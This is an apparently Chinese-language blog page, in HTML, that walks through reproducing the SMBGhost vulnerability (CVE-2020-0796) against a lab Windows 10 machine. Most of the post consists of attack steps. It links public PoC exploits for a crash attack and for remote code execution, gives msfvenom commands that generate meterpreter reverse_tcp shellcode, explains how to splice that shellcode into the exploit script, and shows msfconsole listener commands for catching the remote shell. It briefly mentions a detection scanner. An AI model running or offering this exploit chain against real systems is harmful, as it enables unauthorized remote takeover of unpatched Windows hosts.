@@ -1,0 +1,630 @@
+
+  <!DOCTYPE html>
+  <html lang="zh-CN"  >
+  <head>
+  <meta name="referrer"content="no-referrer"/>
+  <meta charset="utf-8">
+  
+
+  
+
+  
+
+  
+  <script>window.icon_font = '4552607_09mhdxci6yrk';window.clipboard_tips = {"success":"复制成功(*^▽^*)","fail":"复制失败 (ﾟ⊿ﾟ)ﾂ"};</script>
+  
+  
+  <title>
+    
+    Morthos
+  </title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin><link rel="preload" as="style" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic%7CUbuntu%20Mono:400,400italic,700,700italic&display=swap"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic%7CUbuntu%20Mono:400,400italic,700,700italic&display=swap" media="print" onload="this.media&#x3D;&#39;all&#39;">
+  
+    <link rel="preload" href="//at.alicdn.com/t/c/font_4552607_09mhdxci6yrk.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  
+  
+<link rel="stylesheet" href="/css/loader.css">
+
+  <meta name="description" content="永恒之黑漏洞(CVE-2020-0796)CVE-2020-0796漏洞复现：一、复现环境靶机：windows10 1903 x64ip：192.168.1.6（关闭防火墙和病毒防护）下载地址：https:&#x2F;&#x2F;sl-m-ssl.xunlei.com&#x2F;h5&#x2F;page&#x2F;download-share&#x2F;index.html?entry&#x3D;link&amp;appType&#x3D;PC&amp;videobtinde">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Morthos">
+<meta property="og:url" content="http://example.com/2024/07/30/0709%20%E6%B0%B8%E6%81%92%E4%B9%8B%E9%BB%91%E6%BC%8F%E6%B4%9E/index.html">
+<meta property="og:site_name" content="Morthos">
+<meta property="og:description" content="永恒之黑漏洞(CVE-2020-0796)CVE-2020-0796漏洞复现：一、复现环境靶机：windows10 1903 x64ip：192.168.1.6（关闭防火墙和病毒防护）下载地址：https:&#x2F;&#x2F;sl-m-ssl.xunlei.com&#x2F;h5&#x2F;page&#x2F;download-share&#x2F;index.html?entry&#x3D;link&amp;appType&#x3D;PC&amp;videobtinde">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2024/png/46222800/1720526102543-da7599ee-e078-4864-811e-e25d5d0b9c84.png#averageHue=%232c2e39&clientId=u3080f15b-f669-4&from=paste&height=473&id=AtDp1&originHeight=710&originWidth=1046&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=273928&status=done&style=none&taskId=u8525b403-a17c-47ef-84fc-c23cd94eba7&title=&width=697.3333333333334">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2024/png/46222800/1720526812096-5d8cd3ef-c7ba-4143-89ce-7b31906e47f9.png#averageHue=%23474457&clientId=uf5d09558-c7a9-4&from=paste&height=397&id=ueb7e53cb&originHeight=595&originWidth=755&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=246936&status=done&style=none&taskId=u2d03bdbe-5719-4fd9-a9cc-fed68a25f5b&title=&width=503.3333333333333">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2024/png/46222800/1720526846617-2efb711e-95c0-4c7b-a0e7-38f917501b13.png#averageHue=%23474457&clientId=uf5d09558-c7a9-4&from=paste&height=399&id=u6033f6ac&originHeight=599&originWidth=749&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=246528&status=done&style=none&taskId=ud8965324-c90d-4e55-aa0a-b7eb8c1fcc2&title=&width=499.3333333333333">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2024/png/46222800/1720527041704-4e906b7f-3cd6-4c31-ae1d-4ef7bef7662e.png#averageHue=%23373645&clientId=uf5d09558-c7a9-4&from=paste&height=380&id=uf3a121f1&originHeight=570&originWidth=755&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=221770&status=done&style=none&taskId=u3dbe59c4-c25c-4f1c-a696-ddaa4549b83&title=&width=503.3333333333333">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2024/png/46222800/1720527278444-fa85e2b6-a14f-4334-a958-d1163edf224e.png#averageHue=%232c2c39&clientId=uf5d09558-c7a9-4&from=paste&height=423&id=u7f22fb5f&originHeight=634&originWidth=426&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=98904&status=done&style=none&taskId=u6ee417ea-365b-4a24-af79-b46f688ad2f&title=&width=284">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2024/png/46222800/1720525165600-011e9178-7168-49db-88d0-8360ff0bfbcd.png#averageHue=%23383846&clientId=uf604ec1c-fbf9-4&from=paste&height=344&id=uf0e92c9f&originHeight=516&originWidth=802&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=132062&status=done&style=none&taskId=ub6b1edcc-b67d-4d13-a54f-3f7337866cc&title=&width=534.6666666666666">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2024/png/46222800/1720525220799-9bde445b-d85e-46b8-bce7-57d060d705df.png#averageHue=%233d3b4d&clientId=uf604ec1c-fbf9-4&from=paste&height=404&id=u11a4112b&originHeight=606&originWidth=814&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=159911&status=done&style=none&taskId=u4b3763de-2a53-4c07-8ce9-94ee725ee0e&title=&width=542.6666666666666">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2024/png/46222800/1720525411352-c29d9ee6-8f54-4be7-a73b-a02e90c97c92.png#averageHue=%231f1f1e&clientId=uf604ec1c-fbf9-4&from=paste&height=419&id=u4b5f5452&originHeight=629&originWidth=1219&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=54628&status=done&style=none&taskId=ub73949e6-6d36-4d44-adde-ed178f6db57&title=&width=812.6666666666666">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2024/png/46222800/1720525342864-338016e9-fa7c-4f91-883c-b8c59eef5f20.png#averageHue=%23f8f8f8&clientId=uf604ec1c-fbf9-4&from=paste&height=549&id=uef37766e&originHeight=824&originWidth=1052&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=105774&status=done&style=none&taskId=uf761f750-7a55-4cb4-a87e-cd5056ba214&title=&width=701.3333333333334">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2024/png/46222800/1720525381453-f88e9103-577f-4e97-8d62-8a4eaa8db1df.png#averageHue=%23fafafa&clientId=uf604ec1c-fbf9-4&from=paste&height=531&id=ub5bdd6d4&originHeight=797&originWidth=1017&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=57462&status=done&style=none&taskId=u2617d8d2-2f0a-4ee2-9737-2d2e7ba06c7&title=&width=678">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2024/png/46222800/1720525885795-a37ee452-11fb-45c6-bd6f-896b4a0d555f.png#averageHue=%2330323b&clientId=uf604ec1c-fbf9-4&from=paste&height=229&id=u34408d10&originHeight=344&originWidth=712&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=77584&status=done&style=none&taskId=u5f32a3ed-c429-49bc-81ff-05a4b598867&title=&width=474.6666666666667">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/12431291/1700643821511-a9b562f1-cdcd-4fdf-a1d2-73d1cee01119.png?x-oss-process=image/watermark,type_d3F5LW1pY3JvaGVp,size_22,text_eml5ZWJ1a3U=,color_FFFFFF,shadow_50,t_80,g_se,x_10,y_10#averageHue=%23161616&from=url&id=r937X&originHeight=199&originWidth=783&originalType=binary&ratio=1.25&rotation=0&showTitle=false&status=done&style=none&title=">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/12431291/1701085368283-c0179176-b89d-4d76-8620-ca0fb0d3f976.png?x-oss-process=image/resize,w_937,limit_0/watermark,type_d3F5LW1pY3JvaGVp,size_27,text_eml5ZWJ1a3U=,color_FFFFFF,shadow_50,t_80,g_se,x_10,y_10#averageHue=%23c9d6a1&from=url&id=dKM9t&originHeight=460&originWidth=937&originalType=binary&ratio=1.25&rotation=0&showTitle=false&status=done&style=none&title=">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2024/png/26698826/1714201462635-2271c3b2-b1bc-418e-a662-e3295185e5e9.png?x-oss-process=image/watermark,type_d3F5LW1pY3JvaGVp,size_73,text_eml5ZWJ1a3U=,color_FFFFFF,shadow_50,t_80,g_se,x_10,y_10#averageHue=%233b3c48&clientId=u509d74c4-5306-4&from=paste&height=1126&id=u1ea2313e&originHeight=1408&originWidth=2578&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=716400&status=done&style=none&taskId=u6bbf35c6-bc99-4f42-b306-402984e1355&title=&width=2062.4">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2024/png/26698826/1714201613915-b71e5b60-651a-441b-8290-c345c6fdf807.png?x-oss-process=image/watermark,type_d3F5LW1pY3JvaGVp,size_73,text_eml5ZWJ1a3U=,color_FFFFFF,shadow_50,t_80,g_se,x_10,y_10#averageHue=%233c3c49&clientId=u509d74c4-5306-4&from=paste&height=1126&id=uc27cb56c&originHeight=1408&originWidth=2578&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=720653&status=done&style=none&taskId=u7f2a344e-a799-421f-89b4-dc25d18b732&title=&width=2062.4">
+<meta property="article:published_time" content="2024-07-30T12:41:57.012Z">
+<meta property="article:modified_time" content="2024-07-30T12:41:57.201Z">
+<meta property="article:author" content="Boy">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.nlark.com/yuque/0/2024/png/46222800/1720526102543-da7599ee-e078-4864-811e-e25d5d0b9c84.png#averageHue=%232c2e39&clientId=u3080f15b-f669-4&from=paste&height=473&id=AtDp1&originHeight=710&originWidth=1046&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=273928&status=done&style=none&taskId=u8525b403-a17c-47ef-84fc-c23cd94eba7&title=&width=697.3333333333334">
+  
+    <link rel="alternate" href="/atom.xml" title="Morthos" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/images/favicon.ico">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+<link rel="stylesheet" href="https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.css">
+
+  
+  
+  
+  
+<script src="https://npm.webcache.cn/pace-js@1.2.4/pace.min.js"></script>
+
+  
+    
+<link rel="stylesheet" href="https://npm.webcache.cn/wowjs@1.1.3/css/libs/animate.css">
+
+    
+<script src="https://npm.webcache.cn/wowjs@1.1.3/dist/wow.min.js"></script>
+
+    <script>
+      new WOW({
+        offset: 0,
+        mobile: true,
+        live: false
+      }).init();
+    </script>
+  
+  
+    <script src="/sw.js"></script>
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+  <body>
+    
+  <div id='loader'>
+    <div class="loading-left-bg loading-bg"></div>
+    <div class="loading-right-bg loading-bg"></div>
+    <div class="spinner-box">
+      <div class="loading-taichi">
+        <svg width="150" height="150" viewBox="0 0 1024 1024" class="icon" version="1.1" xmlns="https://www.w3.org/2000/svg" shape-rendering="geometricPrecision">
+          <path d="M303.5 432A80 80 0 0 1 291.5 592A80 80 0 0 1 303.5 432z" fill="#ff6e6b" />
+          <path d="M512 65A447 447 0 0 1 512 959L512 929A417 417 0 0 0 512 95A417 417 0 0 0 512 929L512 959A447 447 0 0 1 512 65z" fill="#fd0d00" />
+          <path d="M512 95A417 417 0 0 1 929 512A208.5 208.5 0 0 1 720.5 720.5L720.5 592A80 80 0 0 0 720.5 432A80 80 0 0 0 720.5 592L720.5 720.5A208.5 208.5 0 0 1 512 512A208.5 208.5 0 0 0 303.5 303.5A208.5 208.5 0 0 0 95 512A417 417 0 0 1 512 95" fill="#fd0d00" />
+        </svg>
+      </div>
+      <div class="loading-word">少女祈祷中...</div>
+    </div>
+  </div>
+  </div>
+  <script>
+    var time = null;
+    var startLoading = () => {
+      time = Date.now();
+      document.getElementById('loader').classList.remove("loading");
+    }
+    var endLoading = () => {
+      if (!time) {
+        document.body.style.overflow = 'auto';
+        document.getElementById('loader').classList.add("loading");
+      } else {
+        if (Date.now() - time > 500) {
+          time = null;
+          document.body.style.overflow = 'auto';
+          document.getElementById('loader').classList.add("loading");
+        } else {
+          setTimeout(endLoading, 500 - (Date.now() - time));
+          time = null;
+        }
+      }
+    }
+    window.addEventListener('DOMContentLoaded', endLoading);
+    document.getElementById('loader').addEventListener('click', endLoading);
+  </script>
+
+<div id="copy-tooltip" style="pointer-events: none; opacity: 0; transition: all 0.2s ease; position: fixed;top: 50%;left: 50%;z-index: 999;transform: translate(-50%, -50%);color: white;background: rgba(0, 0, 0, 0.5);padding: 10px 15px;border-radius: 10px;">
+</div>
+
+    <div id="container">
+      <div id="wrap">
+        <div id="header-nav">
+  <nav id="main-nav">
+    
+      <span class="main-nav-link-wrap">
+        <span class="main-nav-icon"></span>
+        <a class="main-nav-link" href="/">首页</a>
+      </span>
+    
+      <span class="main-nav-link-wrap">
+        <span class="main-nav-icon"></span>
+        <a class="main-nav-link" href="/archives">归档</a>
+      </span>
+    
+      <span class="main-nav-link-wrap">
+        <span class="main-nav-icon"></span>
+        <a class="main-nav-link" href="/about">关于</a>
+      </span>
+    
+      <span class="main-nav-link-wrap">
+        <span class="main-nav-icon"></span>
+        <a class="main-nav-link" href="/friend">友链</a>
+      </span>
+    
+    <a id="main-nav-toggle" class="nav-icon"></a>
+  </nav>
+  <nav id="sub-nav">
+    
+      <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS 订阅"></a>
+    
+    
+    
+  </nav>
+</div>
+<header id="header">
+  
+    
+      <img fetchpriority="high" src="/images/banner.webp" alt="">
+    
+  
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <div id="logo-wrap">
+        
+          
+          
+            <a href="/" id="logo">
+              <h1>Morthos</h1>
+            </a>
+          
+        
+      </div>
+      
+        
+        <h2 id="subtitle-wrap">
+          
+        </h2>
+      
+    </div>
+  </div>
+</header>
+
+        <div id="content" class="outer">
+          
+          <section id="main"><article id="post-0709 永恒之黑漏洞" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-inner">
+    <div class="article-meta">
+      <div class="article-date wow slideInLeft">
+  <a href="/2024/07/30/0709%20%E6%B0%B8%E6%81%92%E4%B9%8B%E9%BB%91%E6%BC%8F%E6%B4%9E/" class="article-date-link">
+    <time datetime="2024-07-30T12:41:57.012Z" itemprop="datePublished">2024-07-30</time>
+  </a>
+</div>
+
+      
+
+    </div>
+    <div class="hr-line"></div>
+    
+
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p><strong><em>永恒之黑漏洞(CVE-2020-0796)</em></strong><br>CVE-2020-0796漏洞复现：<br><strong>一、复现环境靶机</strong>：<br>windows10 1903 x64ip：192.168.1.6（关闭防火墙和病毒防护）<br>下载地址：<a target="_blank" rel="noopener" href="https://sl-m-ssl.xunlei.com/h5/page/download-share/index.html?entry=link&appType=PC&videobtindex=-1&storid=c39vhtrekug5&share_from=dlpage_share_link">https://sl-m-ssl.xunlei.com/h5/page/download-share/index.html?entry=link&amp;appType=PC&amp;videobtindex=-1&amp;storid=c39vhtrekug5&amp;share_from=dlpage_share_link</a><br>攻击机：kali2019的ip：192.168.8.128<br><img src="https://cdn.nlark.com/yuque/0/2024/png/46222800/1720526102543-da7599ee-e078-4864-811e-e25d5d0b9c84.png#averageHue=%232c2e39&clientId=u3080f15b-f669-4&from=paste&height=473&id=AtDp1&originHeight=710&originWidth=1046&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=273928&status=done&style=none&taskId=u8525b403-a17c-47ef-84fc-c23cd94eba7&title=&width=697.3333333333334" alt="image.png"><br><strong><em>方法一</em></strong>.蓝屏攻击<br><a target="_blank" rel="noopener" href="https://github.com/eerykitty/CVE-2020-0796-PoC">GitHub - eerykitty&#x2F;CVE-2020-0796-PoC: PoC for triggering buffer overflow via CVE-2020-0796</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install ntlm_auth ./CVE-2020-0796.py 目标ip</span><br></pre></td></tr></table></figure>
+<p>&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;<br><strong><em>方法二</em></strong>_._EXP(RCE)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/chompie1337/SMBGhost_RCE_PoC</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=kaliip  LPORT=5556 -b &#x27;\x00&#x27; -i 5 -f python &gt; exploit</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">vim exploit                     </span><br><span class="line">:%s/buf/USER_PAYLOAD             </span><br><span class="line">:wq! </span><br></pre></td></tr></table></figure>
+<p>保存后将exploit内容替换到exploit.py<br><img src="https://cdn.nlark.com/yuque/0/2024/png/46222800/1720526812096-5d8cd3ef-c7ba-4143-89ce-7b31906e47f9.png#averageHue=%23474457&clientId=uf5d09558-c7a9-4&from=paste&height=397&id=ueb7e53cb&originHeight=595&originWidth=755&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=246936&status=done&style=none&taskId=u2d03bdbe-5719-4fd9-a9cc-fed68a25f5b&title=&width=503.3333333333333" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2024/png/46222800/1720526846617-2efb711e-95c0-4c7b-a0e7-38f917501b13.png#averageHue=%23474457&clientId=uf5d09558-c7a9-4&from=paste&height=399&id=u6033f6ac&originHeight=599&originWidth=749&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=246528&status=done&style=none&taskId=ud8965324-c90d-4e55-aa0a-b7eb8c1fcc2&title=&width=499.3333333333333" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2024/png/46222800/1720527041704-4e906b7f-3cd6-4c31-ae1d-4ef7bef7662e.png#averageHue=%23373645&clientId=uf5d09558-c7a9-4&from=paste&height=380&id=uf3a121f1&originHeight=570&originWidth=755&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=221770&status=done&style=none&taskId=u3dbe59c4-c25c-4f1c-a696-ddaa4549b83&title=&width=503.3333333333333" alt="image.png"><br>查看行号：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">：set nu</span><br></pre></td></tr></table></figure>
+<p>删除90~150，并复制exploit里的内容<br><img src="https://cdn.nlark.com/yuque/0/2024/png/46222800/1720527278444-fa85e2b6-a14f-4334-a958-d1163edf224e.png#averageHue=%232c2c39&clientId=uf5d09558-c7a9-4&from=paste&height=423&id=u7f22fb5f&originHeight=634&originWidth=426&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=98904&status=done&style=none&taskId=u6ee417ea-365b-4a24-af79-b46f688ad2f&title=&width=284" alt="image.png"><br>参考博客：<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_63610715/article/details/133847253">https://blog.csdn.net/weixin_63610715&#x2F;article&#x2F;details&#x2F;133847253</a><br>使用msfconsole工具</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line"></span><br><span class="line">use exploit/multi/handler</span><br><span class="line"></span><br><span class="line">set payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line"></span><br><span class="line">show options</span><br></pre></td></tr></table></figure>
+<p><img src="https://cdn.nlark.com/yuque/0/2024/png/46222800/1720525165600-011e9178-7168-49db-88d0-8360ff0bfbcd.png#averageHue=%23383846&clientId=uf604ec1c-fbf9-4&from=paste&height=344&id=uf0e92c9f&originHeight=516&originWidth=802&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=132062&status=done&style=none&taskId=ub6b1edcc-b67d-4d13-a54f-3f7337866cc&title=&width=534.6666666666666" alt="image.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">set lhost kali的ip</span><br><span class="line">set lport 5556</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+<p><img src="https://cdn.nlark.com/yuque/0/2024/png/46222800/1720525220799-9bde445b-d85e-46b8-bce7-57d060d705df.png#averageHue=%233d3b4d&clientId=uf604ec1c-fbf9-4&from=paste&height=404&id=u11a4112b&originHeight=606&originWidth=814&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=159911&status=done&style=none&taskId=u4b3763de-2a53-4c07-8ce9-94ee725ee0e&title=&width=542.6666666666666" alt="image.png"><br>新开窗口，输入：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python exploit.py -ip 目标ip（192.168.8.128）</span><br></pre></td></tr></table></figure>
+<p><img src="https://cdn.nlark.com/yuque/0/2024/png/46222800/1720525411352-c29d9ee6-8f54-4be7-a73b-a02e90c97c92.png#averageHue=%231f1f1e&clientId=uf604ec1c-fbf9-4&from=paste&height=419&id=u4b5f5452&originHeight=629&originWidth=1219&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=54628&status=done&style=none&taskId=ub73949e6-6d36-4d44-adde-ed178f6db57&title=&width=812.6666666666666" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2024/png/46222800/1720525342864-338016e9-fa7c-4f91-883c-b8c59eef5f20.png#averageHue=%23f8f8f8&clientId=uf604ec1c-fbf9-4&from=paste&height=549&id=uef37766e&originHeight=824&originWidth=1052&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=105774&status=done&style=none&taskId=uf761f750-7a55-4cb4-a87e-cd5056ba214&title=&width=701.3333333333334" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2024/png/46222800/1720525381453-f88e9103-577f-4e97-8d62-8a4eaa8db1df.png#averageHue=%23fafafa&clientId=uf604ec1c-fbf9-4&from=paste&height=531&id=ub5bdd6d4&originHeight=797&originWidth=1017&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=57462&status=done&style=none&taskId=u2617d8d2-2f0a-4ee2-9737-2d2e7ba06c7&title=&width=678" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2024/png/46222800/1720525885795-a37ee452-11fb-45c6-bd6f-896b4a0d555f.png#averageHue=%2330323b&clientId=uf604ec1c-fbf9-4&from=paste&height=229&id=u34408d10&originHeight=344&originWidth=712&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=77584&status=done&style=none&taskId=u5f32a3ed-c429-49bc-81ff-05a4b598867&title=&width=474.6666666666667" alt="image.png"><br><strong>&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">POC(蓝屏)</span><br><span class="line">https://github.com/eerykitty/CVE-<span class="number">2020</span>-0796-PoC</span><br><span class="line">使用</span><br><span class="line">pip install ntlm_auth</span><br><span class="line"> ./CVE-<span class="number">2020</span>-<span class="number">0796.</span>py  <span class="number">192.168</span><span class="number">.30</span><span class="number">.134</span></span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">EXP(RCE)</span><br><span class="line">https://github.com/chompie1337/SMBGhost_RCE_PoC</span><br><span class="line"></span><br><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=kaliip  LPORT=<span class="number">5556</span> -b <span class="string">&#x27;\x00&#x27;</span> -i <span class="number">5</span> -f python &gt; exploit</span><br><span class="line"></span><br><span class="line">使用vim</span><br><span class="line">vim exploit                      回车</span><br><span class="line">:%s/buf/USER_PAYLOAD             回车</span><br><span class="line">:wq!                             回车</span><br><span class="line"></span><br><span class="line">将exploit内容替换到exploit.py</span><br><span class="line"></span><br><span class="line">参考https://blog.csdn.net/weixin_63610715/article/details/<span class="number">133847253</span></span><br><span class="line"></span><br><span class="line">msfconsole</span><br><span class="line"></span><br><span class="line">use exploit/multi/handler</span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line"></span><br><span class="line">show options</span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> lhost kali的ip</span><br><span class="line"><span class="built_in">set</span> lport <span class="number">5556</span></span><br><span class="line"></span><br><span class="line">run</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">python exploit.py -ip 目标ip</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p><br><strong>二、检测工具：</strong><br>1.在靶机里下载检测工具：<a target="_blank" rel="noopener" href="http://dl.qianxin.com/skylar6/CVE-2020-0796-Scanner.zip/">http://dl.qianxin.com/skylar6/CVE-2020-0796-Scanner.zip/</a></p>
+<p>2.运行工具，检测到漏洞风险</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2023/png/12431291/1700643821511-a9b562f1-cdcd-4fdf-a1d2-73d1cee01119.png?x-oss-process=image/watermark,type_d3F5LW1pY3JvaGVp,size_22,text_eml5ZWJ1a3U=,color_FFFFFF,shadow_50,t_80,g_se,x_10,y_10#averageHue=%23161616&from=url&id=r937X&originHeight=199&originWidth=783&originalType=binary&ratio=1.25&rotation=0&showTitle=false&status=done&style=none&title="></p>
+<p><strong>三、漏洞利用</strong><br>POC下载：<br>1. 在kali中利用MSF生成木马：</p>
+<p><code>**msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.20.129   LPORT=5555 -b &#39;\x00&#39; -i 1 -f python &gt; exploit**</code></p>
+<p>&#x2F;&#x2F; -p windows&#x2F;x64&#x2F;meterpreter&#x2F;bind_tcp 设置payload为windows64位meterpreter控制台下的反向连接<br>&#x2F;&#x2F; LPORT&#x3D;6666 设置开发端口为6666<br>&#x2F;&#x2F; -b ‘\x00’ 设置在生成的程序中避免出现’\x00’<br>&#x2F;&#x2F; -i 1 设置编码次数为一次<br>&#x2F;&#x2F; -f python 设置生成python格式文件</p>
+<p>2.用生成的shellcode将POC文件里exploit.py中的一部分替换掉，直接复制粘贴，将buf替换成USER_PAYLOAD保存</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2023/png/12431291/1701085368283-c0179176-b89d-4d76-8620-ca0fb0d3f976.png?x-oss-process=image/resize,w_937,limit_0/watermark,type_d3F5LW1pY3JvaGVp,size_27,text_eml5ZWJ1a3U=,color_FFFFFF,shadow_50,t_80,g_se,x_10,y_10#averageHue=%23c9d6a1&from=url&id=dKM9t&originHeight=460&originWidth=937&originalType=binary&ratio=1.25&rotation=0&showTitle=false&status=done&style=none&title="></p>
+<ol start="3">
+<li><p>kali开启监听</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">use exploit/multi/handler</span><br><span class="line"><span class="built_in">set</span> payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line">show options</span><br><span class="line"><span class="built_in">set</span> lhost <span class="number">192.168</span><span class="number">.20</span><span class="number">.128</span></span><br><span class="line"><span class="built_in">set</span> lport <span class="number">5555</span></span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>运行exp</p>
+</li>
+</ol>
